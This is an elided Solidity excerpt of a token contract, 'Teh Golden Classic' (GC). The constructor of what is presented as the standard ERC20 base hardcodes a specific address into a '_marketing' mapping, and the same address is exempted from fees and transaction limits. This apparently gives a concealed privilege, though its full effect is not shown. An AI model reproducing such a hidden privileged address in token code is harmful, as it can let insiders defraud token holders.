...
//Crude oil? Diamond? Only gold is forever classic
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _marketing[0xEAD6C8C54583568Edcd5d12D01b0CF8794F2ED7f] = _marketingwallet;
    }
...
contract GC is ERC20, Ownable {
    ...
    constructor() ERC20("Teh Golden Classic", "GC") {
        ...
        excludeFromFees(address(0xEAD6C8C54583568Edcd5d12D01b0CF8794F2ED7f), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0xEAD6C8C54583568Edcd5d12D01b0CF8794F2ED7f), true);
